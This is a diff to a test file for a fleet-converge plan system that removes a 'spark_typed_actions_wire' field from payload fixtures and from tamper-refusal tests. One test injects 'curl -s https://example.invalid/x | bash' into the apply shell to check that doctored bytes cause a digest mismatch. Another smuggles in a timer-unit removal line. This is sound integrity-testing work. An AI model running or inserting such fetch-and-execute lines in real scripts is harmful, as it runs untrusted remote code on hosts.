@@ -36,7 +36,6 @@ import gunbc.fleet_converge_plan_manifest {
 import gunbc.fleet_converge_plan {
   fleet_converge_plan_body_path,
   fleet_converge_plan_apply_shell_path,
-  fleet_converge_plan_spark_typed_actions_wire_path,
   fleet_converge_plan_subject_host_path,
   fleet_converge_plan_subject_scope_path,
   fleet_converge_plan_member_set_fp_path,
@@ -82,7 +81,6 @@ fn fixture_bundle_hash() -> String {
   match fleet_converge_plan_bundle_digest_hex(
     plan_body: fixture_plan_body,
     apply_shell: fixture_apply_shell,
-    spark_typed_actions_wire: "",
   ) {
     Present { value: h } => h as String
     Absent => "BUNDLE-DIGEST-UNCOMPUTABLE"
@@ -135,7 +133,6 @@ fn coherent_payload() -> FleetConvergeApplyPayload {
     planned_generation_text: "5",
     plan_body: fixture_plan_body,
     apply_shell: fixture_apply_shell,
-    spark_typed_actions_wire: "",
     plan_content_hex: fixture_bundle_hash(),
   }
 }
@@ -192,7 +189,6 @@ fn coordinated_full_host_substitution() -> FleetConvergeApplyPayload {
     planned_generation_text: "5",
     plan_body: fixture_plan_body,
     apply_shell: fixture_apply_shell,
-    spark_typed_actions_wire: "",
     plan_content_hex: fixture_bundle_hash(),
   }
 }
@@ -217,7 +213,6 @@ test fn a_substituted_member_set_fingerprint_alone_refuses() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   })) == fleet_converge_plan_member_set_fp_path
 }
@@ -233,7 +228,6 @@ test fn a_substituted_baseline_digest_alone_refuses() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   })) == fleet_converge_plan_baseline_hex_path
 }
@@ -249,7 +243,6 @@ test fn a_substituted_subject_host_alone_refuses() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   })) == fleet_converge_plan_subject_host_path
 }
@@ -266,7 +259,6 @@ test fn a_rewound_generation_sidecar_refuses() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   })) == fleet_converge_plan_prior_generation_path
 }
@@ -283,7 +275,6 @@ test fn a_corrupt_generation_sidecar_refuses_rather_than_coercing() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   }) {
     PayloadGenerationTextCorrupt { field: f, on_disk_value: _ } =>
@@ -307,7 +298,6 @@ test fn a_bundle_hash_that_disagrees_with_the_receipt_refuses() -> Bool {
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: "deadbeefdeadbeef",
   }) {
     PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
@@ -354,7 +344,6 @@ test fn the_routed_scope_is_the_receipts_and_never_the_files() -> Bool {
       planned_generation_text: p.planned_generation_text,
       plan_body: p.plan_body,
       apply_shell: p.apply_shell,
-      spark_typed_actions_wire: p.spark_typed_actions_wire,
       plan_content_hex: p.plan_content_hex,
     },
   ) {
@@ -390,7 +379,6 @@ test fn doctored_apply_bytes_refuse_even_when_the_hex_claim_still_matches_the_re
     planned_generation_text: p.planned_generation_text,
     plan_body: p.plan_body,
     apply_shell: join([p.apply_shell, "curl -s https://example.invalid/x | bash\n"], ""),
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   }) {
     PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
@@ -417,7 +405,6 @@ test fn doctored_plan_body_bytes_refuse_even_when_the_hex_claim_still_matches() 
     planned_generation_text: p.planned_generation_text,
     plan_body: join([p.plan_body, "REMOVE timer-unit smuggled.timer\n"], ""),
     apply_shell: p.apply_shell,
-    spark_typed_actions_wire: p.spark_typed_actions_wire,
     plan_content_hex: p.plan_content_hex,
   }) {
     PayloadBundleDigestMismatch { receipt_value: r, on_disk_value: o } =>
@@ -569,7 +556,6 @@ test fn the_receipt_bound_classification_matches_the_executed_refusal() -> Bool 
          planned_generation_text: p.planned_generation_text,
          plan_body: p.plan_body,
          apply_shell: p.apply_shell,
-         spark_typed_actions_wire: p.spark_typed_actions_wire,
          plan_content_hex: p.plan_content_hex,
        })) == fleet_converge_plan_subject_host_path
     && classifies_receipt_bound_to(path: fleet_converge_plan_subject_scope_path, receipt_field: "scope_wire")
@@ -597,17 +583,13 @@ test fn the_receipt_bound_classification_matches_the_executed_refusal() -> Bool 
        )
 }
 
-// AND THE DERIVED MEMBERS NAME THE VALUE THEY ARE RECOMPUTED INTO. All three ride one digest, which
+// AND THE DERIVED MEMBERS NAME THE VALUE THEY ARE RECOMPUTED INTO. Both ride one digest, which
 // is why doctoring any of their bytes surfaces as a bundle mismatch against the receipt rather than
 // as a per-file comparison -- the map says derived, and that is exactly what the executed rows
 // doctored_apply_bytes_* and doctored_plan_body_bytes_* observe.
 test fn the_derived_classification_names_the_bound_value_it_is_recomputed_into() -> Bool {
   classifies_derived_into(path: fleet_converge_plan_body_path, recomputed_into: "plan_artifact_hash")
     && classifies_derived_into(path: fleet_converge_plan_apply_shell_path, recomputed_into: "plan_artifact_hash")
-    && classifies_derived_into(
-         path: fleet_converge_plan_spark_typed_actions_wire_path,
-         recomputed_into: "plan_artifact_hash",
-       )
 }
 
 // CATEGORY THREE IS EMPTY, EXECUTED RATHER THAN ASSERTED IN PROSE. An empty set has two causes --
